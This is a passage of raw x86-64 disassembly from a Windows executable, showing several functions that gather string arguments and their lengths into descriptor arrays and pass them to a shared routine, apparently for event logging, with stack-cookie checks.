   140003440:	48 8d 05 93 b3 03 00 	lea    0x3b393(%rip),%rax        # 0x14003e7da
   140003447:	2b c1                	sub    %ecx,%eax
   140003449:	41 c7 40 1c 01 00 00 	movl   $0x1,0x1c(%r8)
   140003450:	00 
   140003451:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140003455:	4d 8b c2             	mov    %r10,%r8
   140003458:	8b 44 24 78          	mov    0x78(%rsp),%eax
   14000345c:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140003460:	49 8b 4b 20          	mov    0x20(%r11),%rcx
   140003464:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003468:	ff 15 6a 21 03 00    	call   *0x3216a(%rip)        # 0x1400355d8
   14000346e:	48 83 c4 48          	add    $0x48,%rsp
   140003472:	c3                   	ret
   140003473:	cc                   	int3
   140003474:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003479:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000347e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003483:	55                   	push   %rbp
   140003484:	41 54                	push   %r12
   140003486:	41 55                	push   %r13
   140003488:	41 56                	push   %r14
   14000348a:	41 57                	push   %r15
   14000348c:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   140003491:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140003498:	48 8b 05 11 0b 04 00 	mov    0x40b11(%rip),%rax        # 0x140043fb0
   14000349f:	48 33 c4             	xor    %rsp,%rax
   1400034a2:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400034a6:	48 8b 85 b8 00 00 00 	mov    0xb8(%rbp),%rax
   1400034ad:	48 8b 8d 00 01 00 00 	mov    0x100(%rbp),%rcx
   1400034b4:	83 65 4c 00          	andl   $0x0,0x4c(%rbp)
   1400034b8:	83 65 3c 00          	andl   $0x0,0x3c(%rbp)
   1400034bc:	83 65 2c 00          	andl   $0x0,0x2c(%rbp)
   1400034c0:	83 65 1c 00          	andl   $0x0,0x1c(%rbp)
   1400034c4:	48 8b 19             	mov    (%rcx),%rbx
   1400034c7:	4c 8b ad c0 00 00 00 	mov    0xc0(%rbp),%r13
   1400034ce:	4c 8b a5 c8 00 00 00 	mov    0xc8(%rbp),%r12
   1400034d5:	4c 8b bd e0 00 00 00 	mov    0xe0(%rbp),%r15
   1400034dc:	4c 8b b5 e8 00 00 00 	mov    0xe8(%rbp),%r14
   1400034e3:	48 8b b5 f0 00 00 00 	mov    0xf0(%rbp),%rsi
   1400034ea:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400034ef:	48 8b 85 20 01 00 00 	mov    0x120(%rbp),%rax
   1400034f6:	48 89 45 40          	mov    %rax,0x40(%rbp)
   1400034fa:	48 8b 85 18 01 00 00 	mov    0x118(%rbp),%rax
   140003501:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003505:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   14000350c:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140003511:	ba 04 00 00 00       	mov    $0x4,%edx
   140003516:	48 89 45 20          	mov    %rax,0x20(%rbp)
   14000351a:	48 8b 85 08 01 00 00 	mov    0x108(%rbp),%rax
   140003521:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003525:	89 55 48             	mov    %edx,0x48(%rbp)
   140003528:	8d 7a fe             	lea    -0x2(%rdx),%edi
   14000352b:	89 55 38             	mov    %edx,0x38(%rbp)
   14000352e:	89 55 28             	mov    %edx,0x28(%rbp)
   140003531:	89 55 18             	mov    %edx,0x18(%rbp)
   140003534:	48 85 db             	test   %rbx,%rbx
   140003537:	74 11                	je     0x14000354a
   140003539:	48 8b cb             	mov    %rbx,%rcx
   14000353c:	e8 9b 0e 00 00       	call   0x1400043dc
   140003541:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003548:	eb 09                	jmp    0x140003553
   14000354a:	48 8d 1d b3 7f 03 00 	lea    0x37fb3(%rip),%rbx        # 0x14003b504
   140003551:	8b cf                	mov    %edi,%ecx
   140003553:	83 65 0c 00          	andl   $0x0,0xc(%rbp)
   140003557:	83 65 fc 00          	andl   $0x0,-0x4(%rbp)
   14000355b:	48 8b 85 f8 00 00 00 	mov    0xf8(%rbp),%rax
   140003562:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140003566:	48 8b 1e             	mov    (%rsi),%rbx
   140003569:	89 4d 08             	mov    %ecx,0x8(%rbp)
   14000356c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003570:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   140003577:	48 85 db             	test   %rbx,%rbx
   14000357a:	74 11                	je     0x14000358d
   14000357c:	48 8b cb             	mov    %rbx,%rcx
   14000357f:	e8 ec de 02 00       	call   0x140031470
   140003584:	be 01 00 00 00       	mov    $0x1,%esi
   140003589:	03 c6                	add    %esi,%eax
   14000358b:	eb 0e                	jmp    0x14000359b
   14000358d:	be 01 00 00 00       	mov    $0x1,%esi
   140003592:	48 8d 1d 67 7f 03 00 	lea    0x37f67(%rip),%rbx        # 0x14003b500
   140003599:	8b c6                	mov    %esi,%eax
   14000359b:	83 65 ec 00          	andl   $0x0,-0x14(%rbp)
   14000359f:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   1400035a3:	49 8b 1e             	mov    (%r14),%rbx
   1400035a6:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400035a9:	48 85 db             	test   %rbx,%rbx
   1400035ac:	74 0c                	je     0x1400035ba
   1400035ae:	48 8b cb             	mov    %rbx,%rcx
   1400035b1:	e8 ba de 02 00       	call   0x140031470
   1400035b6:	03 c6                	add    %esi,%eax
   1400035b8:	eb 09                	jmp    0x1400035c3
   1400035ba:	48 8d 1d 3f 7f 03 00 	lea    0x37f3f(%rip),%rbx        # 0x14003b500
   1400035c1:	8b c6                	mov    %esi,%eax
   1400035c3:	83 65 dc 00          	andl   $0x0,-0x24(%rbp)
   1400035c7:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   1400035cb:	49 8b 1f             	mov    (%r15),%rbx
   1400035ce:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400035d1:	48 85 db             	test   %rbx,%rbx
   1400035d4:	74 0c                	je     0x1400035e2
   1400035d6:	48 8b cb             	mov    %rbx,%rcx
   1400035d9:	e8 92 de 02 00       	call   0x140031470
   1400035de:	03 c6                	add    %esi,%eax
   1400035e0:	eb 09                	jmp    0x1400035eb
   1400035e2:	48 8d 1d 17 7f 03 00 	lea    0x37f17(%rip),%rbx        # 0x14003b500
   1400035e9:	8b c6                	mov    %esi,%eax
   1400035eb:	83 65 cc 00          	andl   $0x0,-0x34(%rbp)
   1400035ef:	41 be 08 00 00 00    	mov    $0x8,%r14d
   1400035f5:	83 65 bc 00          	andl   $0x0,-0x44(%rbp)
   1400035f9:	83 65 ac 00          	andl   $0x0,-0x54(%rbp)
   1400035fd:	89 45 c8             	mov    %eax,-0x38(%rbp)
   140003600:	48 8b 85 d8 00 00 00 	mov    0xd8(%rbp),%rax
   140003607:	48 89 5d c0          	mov    %rbx,-0x40(%rbp)
   14000360b:	49 8b 1c 24          	mov    (%r12),%rbx
   14000360f:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140003613:	48 8b 85 d0 00 00 00 	mov    0xd0(%rbp),%rax
   14000361a:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   14000361e:	c7 45 b8 04 00 00 00 	movl   $0x4,-0x48(%rbp)
   140003625:	44 89 75 a8          	mov    %r14d,-0x58(%rbp)
   140003629:	48 85 db             	test   %rbx,%rbx
   14000362c:	74 11                	je     0x14000363f
   14000362e:	48 8b cb             	mov    %rbx,%rcx
   140003631:	e8 a6 0d 00 00       	call   0x1400043dc
   140003636:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000363d:	eb 09                	jmp    0x140003648
   14000363f:	48 8d 1d be 7e 03 00 	lea    0x37ebe(%rip),%rbx        # 0x14003b504
   140003646:	8b cf                	mov    %edi,%ecx
   140003648:	83 65 9c 00          	andl   $0x0,-0x64(%rbp)
   14000364c:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   140003650:	49 8b 5d 00          	mov    0x0(%r13),%rbx
   140003654:	89 4d 98             	mov    %ecx,-0x68(%rbp)
   140003657:	48 85 db             	test   %rbx,%rbx
   14000365a:	74 11                	je     0x14000366d
   14000365c:	48 8b cb             	mov    %rbx,%rcx
   14000365f:	e8 78 0d 00 00       	call   0x1400043dc
   140003664:	8d 3c 45 02 00 00 00 	lea    0x2(,%rax,2),%edi
   14000366b:	eb 07                	jmp    0x140003674
   14000366d:	48 8d 1d 90 7e 03 00 	lea    0x37e90(%rip),%rbx        # 0x14003b504
   140003674:	83 65 8c 00          	andl   $0x0,-0x74(%rbp)
   140003678:	48 89 5d 80          	mov    %rbx,-0x80(%rbp)
   14000367c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003681:	89 7d 88             	mov    %edi,-0x78(%rbp)
   140003684:	48 8b 1b             	mov    (%rbx),%rbx
   140003687:	48 85 db             	test   %rbx,%rbx
   14000368a:	74 0c                	je     0x140003698
   14000368c:	48 8b cb             	mov    %rbx,%rcx
   14000368f:	e8 dc dd 02 00       	call   0x140031470
   140003694:	03 c6                	add    %esi,%eax
   140003696:	eb 09                	jmp    0x1400036a1
   140003698:	48 8d 1d 61 7e 03 00 	lea    0x37e61(%rip),%rbx        # 0x14003b500
   14000369f:	8b c6                	mov    %esi,%eax
   1400036a1:	83 64 24 7c 00       	andl   $0x0,0x7c(%rsp)
   1400036a6:	48 8d 0d 03 fc 03 00 	lea    0x3fc03(%rip),%rcx        # 0x1400432b0
   1400036ad:	83 64 24 6c 00       	andl   $0x0,0x6c(%rsp)
   1400036b2:	45 33 c9             	xor    %r9d,%r9d
   1400036b5:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400036ba:	45 33 c0             	xor    %r8d,%r8d
   1400036bd:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400036c1:	48 8b 85 b0 00 00 00 	mov    0xb0(%rbp),%rax
   1400036c8:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400036cd:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400036d2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400036d7:	c7 44 24 20 11 00 00 	movl   $0x11,0x20(%rsp)
   1400036de:	00 
   1400036df:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400036e4:	44 89 74 24 68       	mov    %r14d,0x68(%rsp)
   1400036e9:	e8 ee fc ff ff       	call   0x1400033dc
   1400036ee:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400036f2:	48 33 cc             	xor    %rsp,%rcx
   1400036f5:	e8 56 5c 00 00       	call   0x140009350
   1400036fa:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140003701:	00 
   140003702:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003706:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000370a:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000370e:	49 8b e3             	mov    %r11,%rsp
   140003711:	41 5f                	pop    %r15
   140003713:	41 5e                	pop    %r14
   140003715:	41 5d                	pop    %r13
   140003717:	41 5c                	pop    %r12
   140003719:	5d                   	pop    %rbp
   14000371a:	c3                   	ret
   14000371b:	cc                   	int3
   14000371c:	48 8b c4             	mov    %rsp,%rax
   14000371f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003723:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003727:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000372b:	55                   	push   %rbp
   14000372c:	41 54                	push   %r12
   14000372e:	41 55                	push   %r13
   140003730:	41 56                	push   %r14
   140003732:	41 57                	push   %r15
   140003734:	48 8d a8 48 ff ff ff 	lea    -0xb8(%rax),%rbp
   14000373b:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
   140003742:	48 8b 05 67 08 04 00 	mov    0x40867(%rip),%rax        # 0x140043fb0
   140003749:	48 33 c4             	xor    %rsp,%rax
   14000374c:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   140003753:	48 8b 85 e8 00 00 00 	mov    0xe8(%rbp),%rax
   14000375a:	48 8b 8d 30 01 00 00 	mov    0x130(%rbp),%rcx
   140003761:	4c 8b ad 00 01 00 00 	mov    0x100(%rbp),%r13
   140003768:	4c 8b a5 08 01 00 00 	mov    0x108(%rbp),%r12
   14000376f:	4c 8b bd 18 01 00 00 	mov    0x118(%rbp),%r15
   140003776:	48 8b 39             	mov    (%rcx),%rdi
   140003779:	4c 8b b5 20 01 00 00 	mov    0x120(%rbp),%r14
   140003780:	48 8b b5 28 01 00 00 	mov    0x128(%rbp),%rsi
   140003787:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000378c:	48 8b 85 68 01 00 00 	mov    0x168(%rbp),%rax
   140003793:	48 89 45 70          	mov    %rax,0x70(%rbp)
   140003797:	48 8b 85 60 01 00 00 	mov    0x160(%rbp),%rax
   14000379e:	48 89 45 60          	mov    %rax,0x60(%rbp)
   1400037a2:	48 8b 85 58 01 00 00 	mov    0x158(%rbp),%rax
   1400037a9:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400037ad:	48 8b 85 50 01 00 00 	mov    0x150(%rbp),%rax
   1400037b4:	48 89 45 40          	mov    %rax,0x40(%rbp)
   1400037b8:	48 8b 85 48 01 00 00 	mov    0x148(%rbp),%rax
   1400037bf:	48 89 45 30          	mov    %rax,0x30(%rbp)
   1400037c3:	48 8b 85 40 01 00 00 	mov    0x140(%rbp),%rax
   1400037ca:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400037cf:	33 d2                	xor    %edx,%edx
   1400037d1:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400037d5:	48 8b 85 38 01 00 00 	mov    0x138(%rbp),%rax
   1400037dc:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400037e0:	48 c7 45 78 08 00 00 	movq   $0x8,0x78(%rbp)
   1400037e7:	00 
   1400037e8:	48 c7 45 68 08 00 00 	movq   $0x8,0x68(%rbp)
   1400037ef:	00 
   1400037f0:	48 c7 45 58 04 00 00 	movq   $0x4,0x58(%rbp)
   1400037f7:	00 
   1400037f8:	48 c7 45 48 04 00 00 	movq   $0x4,0x48(%rbp)
   1400037ff:	00 
   140003800:	48 c7 45 38 04 00 00 	movq   $0x4,0x38(%rbp)
   140003807:	00 
   140003808:	48 c7 45 28 04 00 00 	movq   $0x4,0x28(%rbp)
   14000380f:	00 
   140003810:	48 c7 45 18 04 00 00 	movq   $0x4,0x18(%rbp)
   140003817:	00 
   140003818:	48 85 ff             	test   %rdi,%rdi
   14000381b:	74 13                	je     0x140003830
   14000381d:	48 8b cf             	mov    %rdi,%rcx
   140003820:	e8 4b dc 02 00       	call   0x140031470
   140003825:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000382a:	03 c3                	add    %ebx,%eax
   14000382c:	33 d2                	xor    %edx,%edx
   14000382e:	eb 0e                	jmp    0x14000383e
   140003830:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003835:	48 8d 3d c4 7c 03 00 	lea    0x37cc4(%rip),%rdi        # 0x14003b500
   14000383c:	8b c3                	mov    %ebx,%eax
   14000383e:	48 89 7d 00          	mov    %rdi,0x0(%rbp)
   140003842:	48 8b 3e             	mov    (%rsi),%rdi
   140003845:	89 45 08             	mov    %eax,0x8(%rbp)
   140003848:	89 55 0c             	mov    %edx,0xc(%rbp)
   14000384b:	48 85 ff             	test   %rdi,%rdi
   14000384e:	74 0e                	je     0x14000385e
   140003850:	48 8b cf             	mov    %rdi,%rcx
   140003853:	e8 18 dc 02 00       	call   0x140031470
   140003858:	03 c3                	add    %ebx,%eax
   14000385a:	33 d2                	xor    %edx,%edx
   14000385c:	eb 09                	jmp    0x140003867
   14000385e:	48 8d 3d 9b 7c 03 00 	lea    0x37c9b(%rip),%rdi        # 0x14003b500
   140003865:	8b c3                	mov    %ebx,%eax
   140003867:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   14000386b:	49 8b 3e             	mov    (%r14),%rdi
   14000386e:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140003871:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140003874:	48 85 ff             	test   %rdi,%rdi
   140003877:	74 0e                	je     0x140003887
   140003879:	48 8b cf             	mov    %rdi,%rcx
   14000387c:	e8 ef db 02 00       	call   0x140031470
   140003881:	03 c3                	add    %ebx,%eax
   140003883:	33 d2                	xor    %edx,%edx
   140003885:	eb 09                	jmp    0x140003890
   140003887:	48 8d 3d 72 7c 03 00 	lea    0x37c72(%rip),%rdi        # 0x14003b500
   14000388e:	8b c3                	mov    %ebx,%eax
   140003890:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   140003894:	49 8b 3f             	mov    (%r15),%rdi
   140003897:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000389a:	89 55 ec             	mov    %edx,-0x14(%rbp)
   14000389d:	48 85 ff             	test   %rdi,%rdi
   1400038a0:	74 0e                	je     0x1400038b0
   1400038a2:	48 8b cf             	mov    %rdi,%rcx
   1400038a5:	e8 c6 db 02 00       	call   0x140031470
   1400038aa:	03 c3                	add    %ebx,%eax
   1400038ac:	33 d2                	xor    %edx,%edx
   1400038ae:	eb 09                	jmp    0x1400038b9
   1400038b0:	48 8d 3d 49 7c 03 00 	lea    0x37c49(%rip),%rdi        # 0x14003b500
   1400038b7:	8b c3                	mov    %ebx,%eax
   1400038b9:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   1400038bd:	be 02 00 00 00       	mov    $0x2,%esi
   1400038c2:	49 8b 3c 24          	mov    (%r12),%rdi
   1400038c6:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400038c9:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   1400038d0:	89 55 dc             	mov    %edx,-0x24(%rbp)
   1400038d3:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400038d7:	48 c7 45 c8 01 00 00 	movq   $0x1,-0x38(%rbp)
   1400038de:	00 
   1400038df:	48 85 ff             	test   %rdi,%rdi
   1400038e2:	74 13                	je     0x1400038f7
   1400038e4:	48 8b cf             	mov    %rdi,%rcx
   1400038e7:	e8 f0 0a 00 00       	call   0x1400043dc
   1400038ec:	33 d2                	xor    %edx,%edx
   1400038ee:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400038f5:	eb 09                	jmp    0x140003900
   1400038f7:	48 8d 3d 06 7c 03 00 	lea    0x37c06(%rip),%rdi        # 0x14003b504
   1400038fe:	8b ce                	mov    %esi,%ecx
   140003900:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   140003904:	49 8b 7d 00          	mov    0x0(%r13),%rdi
   140003908:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   14000390b:	89 55 bc             	mov    %edx,-0x44(%rbp)
   14000390e:	48 85 ff             	test   %rdi,%rdi
   140003911:	74 13                	je     0x140003926
   140003913:	48 8b cf             	mov    %rdi,%rcx
   140003916:	e8 c1 0a 00 00       	call   0x1400043dc
   14000391b:	33 d2                	xor    %edx,%edx
   14000391d:	8d 34 45 02 00 00 00 	lea    0x2(,%rax,2),%esi
   140003924:	eb 07                	jmp    0x14000392d
   140003926:	48 8d 3d d7 7b 03 00 	lea    0x37bd7(%rip),%rdi        # 0x14003b504
   14000392d:	48 8b 85 f8 00 00 00 	mov    0xf8(%rbp),%rax
   140003934:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   140003938:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000393d:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140003941:	48 8b 85 f0 00 00 00 	mov    0xf0(%rbp),%rax
   140003948:	89 75 a8             	mov    %esi,-0x58(%rbp)
   14000394b:	48 8b 3f             	mov    (%rdi),%rdi
   14000394e:	89 55 ac             	mov    %edx,-0x54(%rbp)
   140003951:	48 c7 45 98 04 00 00 	movq   $0x4,-0x68(%rbp)
   140003958:	00 
   140003959:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000395d:	48 c7 45 88 01 00 00 	movq   $0x1,-0x78(%rbp)
   140003964:	00 
   140003965:	48 85 ff             	test   %rdi,%rdi
   140003968:	74 0e                	je     0x140003978
   14000396a:	48 8b cf             	mov    %rdi,%rcx
   14000396d:	e8 fe da 02 00       	call   0x140031470
   140003972:	03 c3                	add    %ebx,%eax
   140003974:	33 d2                	xor    %edx,%edx
   140003976:	eb 09                	jmp    0x140003981
   140003978:	48 8d 3d 81 7b 03 00 	lea    0x37b81(%rip),%rdi        # 0x14003b500
   14000397f:	8b c3                	mov    %ebx,%eax
   140003981:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140003985:	48 8d 0d 24 f9 03 00 	lea    0x3f924(%rip),%rcx        # 0x1400432b0
   14000398c:	48 8b 85 e0 00 00 00 	mov    0xe0(%rbp),%rax
   140003993:	45 33 c9             	xor    %r9d,%r9d
   140003996:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000399b:	45 33 c0             	xor    %r8d,%r8d
   14000399e:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400039a3:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   1400039a7:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400039ac:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039b1:	c7 44 24 20 14 00 00 	movl   $0x14,0x20(%rsp)
   1400039b8:	00 
   1400039b9:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400039be:	48 c7 44 24 68 08 00 	movq   $0x8,0x68(%rsp)
   1400039c5:	00 00 
   1400039c7:	e8 10 fa ff ff       	call   0x1400033dc
   1400039cc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400039d3:	48 33 cc             	xor    %rsp,%rcx
   1400039d6:	e8 75 59 00 00       	call   0x140009350
   1400039db:	4c 8d 9c 24 90 01 00 	lea    0x190(%rsp),%r11
   1400039e2:	00 
   1400039e3:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400039e7:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400039eb:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1400039ef:	49 8b e3             	mov    %r11,%rsp
   1400039f2:	41 5f                	pop    %r15
   1400039f4:	41 5e                	pop    %r14
   1400039f6:	41 5d                	pop    %r13
   1400039f8:	41 5c                	pop    %r12
   1400039fa:	5d                   	pop    %rbp
   1400039fb:	c3                   	ret
   1400039fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003a01:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003a06:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003a0b:	55                   	push   %rbp
   140003a0c:	41 54                	push   %r12
   140003a0e:	41 55                	push   %r13
   140003a10:	41 56                	push   %r14
   140003a12:	41 57                	push   %r15
   140003a14:	48 8d 6c 24 90       	lea    -0x70(%rsp),%rbp
   140003a19:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   140003a20:	48 8b 05 89 05 04 00 	mov    0x40589(%rip),%rax        # 0x140043fb0
   140003a27:	48 33 c4             	xor    %rsp,%rax
   140003a2a:	48 89 45 60          	mov    %rax,0x60(%rbp)
   140003a2e:	48 8b 85 38 01 00 00 	mov    0x138(%rbp),%rax
   140003a35:	48 8b 8d 08 01 00 00 	mov    0x108(%rbp),%rcx
   140003a3c:	4c 8b ad c8 00 00 00 	mov    0xc8(%rbp),%r13
   140003a43:	4c 8b a5 e0 00 00 00 	mov    0xe0(%rbp),%r12
   140003a4a:	4c 8b bd e8 00 00 00 	mov    0xe8(%rbp),%r15
   140003a51:	48 8b 39             	mov    (%rcx),%rdi
   140003a54:	4c 8b b5 f8 00 00 00 	mov    0xf8(%rbp),%r14
   140003a5b:	48 8b b5 00 01 00 00 	mov    0x100(%rbp),%rsi
   140003a62:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140003a66:	48 8b 85 30 01 00 00 	mov    0x130(%rbp),%rax
   140003a6d:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140003a71:	48 8b 85 28 01 00 00 	mov    0x128(%rbp),%rax
   140003a78:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003a7c:	48 8b 85 20 01 00 00 	mov    0x120(%rbp),%rax
   140003a83:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140003a87:	48 8b 85 18 01 00 00 	mov    0x118(%rbp),%rax
   140003a8e:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140003a93:	33 d2                	xor    %edx,%edx
   140003a95:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003a99:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   140003aa0:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140003aa4:	48 c7 45 58 08 00 00 	movq   $0x8,0x58(%rbp)
   140003aab:	00 
   140003aac:	48 c7 45 48 08 00 00 	movq   $0x8,0x48(%rbp)
   140003ab3:	00 
   140003ab4:	48 c7 45 38 04 00 00 	movq   $0x4,0x38(%rbp)
   140003abb:	00 
   140003abc:	48 c7 45 28 04 00 00 	movq   $0x4,0x28(%rbp)
   140003ac3:	00 
   140003ac4:	48 c7 45 18 04 00 00 	movq   $0x4,0x18(%rbp)
   140003acb:	00 
   140003acc:	48 c7 45 08 04 00 00 	movq   $0x4,0x8(%rbp)
   140003ad3:	00 
   140003ad4:	48 85 ff             	test   %rdi,%rdi
   140003ad7:	74 13                	je     0x140003aec
   140003ad9:	48 8b cf             	mov    %rdi,%rcx
   140003adc:	e8 8f d9 02 00       	call   0x140031470
   140003ae1:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003ae6:	03 c3                	add    %ebx,%eax
   140003ae8:	33 d2                	xor    %edx,%edx
   140003aea:	eb 0e                	jmp    0x140003afa
   140003aec:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003af1:	48 8d 3d 08 7a 03 00 	lea    0x37a08(%rip),%rdi        # 0x14003b500
   140003af8:	8b c3                	mov    %ebx,%eax
   140003afa:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   140003afe:	48 8b 3e             	mov    (%rsi),%rdi
   140003b01:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140003b04:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140003b07:	48 85 ff             	test   %rdi,%rdi
   140003b0a:	74 0e                	je     0x140003b1a
   140003b0c:	48 8b cf             	mov    %rdi,%rcx
   140003b0f:	e8 5c d9 02 00       	call   0x140031470
   140003b14:	03 c3                	add    %ebx,%eax
   140003b16:	33 d2                	xor    %edx,%edx
   140003b18:	eb 09                	jmp    0x140003b23
   140003b1a:	48 8d 3d df 79 03 00 	lea    0x379df(%rip),%rdi        # 0x14003b500
   140003b21:	8b c3                	mov    %ebx,%eax
   140003b23:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   140003b27:	49 8b 3e             	mov    (%r14),%rdi
   140003b2a:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140003b2d:	89 55 ec             	mov    %edx,-0x14(%rbp)
   140003b30:	48 85 ff             	test   %rdi,%rdi
   140003b33:	74 0e                	je     0x140003b43
   140003b35:	48 8b cf             	mov    %rdi,%rcx
   140003b38:	e8 33 d9 02 00       	call   0x140031470
   140003b3d:	03 c3                	add    %ebx,%eax
   140003b3f:	33 d2                	xor    %edx,%edx
   140003b41:	eb 09                	jmp    0x140003b4c
   140003b43:	48 8d 3d b6 79 03 00 	lea    0x379b6(%rip),%rdi        # 0x14003b500
   140003b4a:	8b c3                	mov    %ebx,%eax
   140003b4c:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   140003b50:	be 02 00 00 00       	mov    $0x2,%esi
   140003b55:	49 8b 3f             	mov    (%r15),%rdi
   140003b58:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140003b5b:	48 8b 85 f0 00 00 00 	mov    0xf0(%rbp),%rax
   140003b62:	89 55 dc             	mov    %edx,-0x24(%rbp)
   140003b65:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140003b69:	48 c7 45 c8 01 00 00 	movq   $0x1,-0x38(%rbp)
   140003b70:	00 
   140003b71:	48 85 ff             	test   %rdi,%rdi
   140003b74:	74 13                	je     0x140003b89
   140003b76:	48 8b cf             	mov    %rdi,%rcx
   140003b79:	e8 5e 08 00 00       	call   0x1400043dc
   140003b7e:	33 d2                	xor    %edx,%edx
   140003b80:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003b87:	eb 09                	jmp    0x140003b92
   140003b89:	48 8d 3d 74 79 03 00 	lea    0x37974(%rip),%rdi        # 0x14003b504
   140003b90:	8b ce                	mov    %esi,%ecx
   140003b92:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   140003b96:	49 8b 3c 24          	mov    (%r12),%rdi
   140003b9a:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   140003b9d:	89 55 bc             	mov    %edx,-0x44(%rbp)
   140003ba0:	48 85 ff             	test   %rdi,%rdi
   140003ba3:	74 13                	je     0x140003bb8
   140003ba5:	48 8b cf             	mov    %rdi,%rcx
   140003ba8:	e8 2f 08 00 00       	call   0x1400043dc
   140003bad:	33 d2                	xor    %edx,%edx
   140003baf:	8d 34 45 02 00 00 00 	lea    0x2(,%rax,2),%esi
   140003bb6:	eb 07                	jmp    0x140003bbf
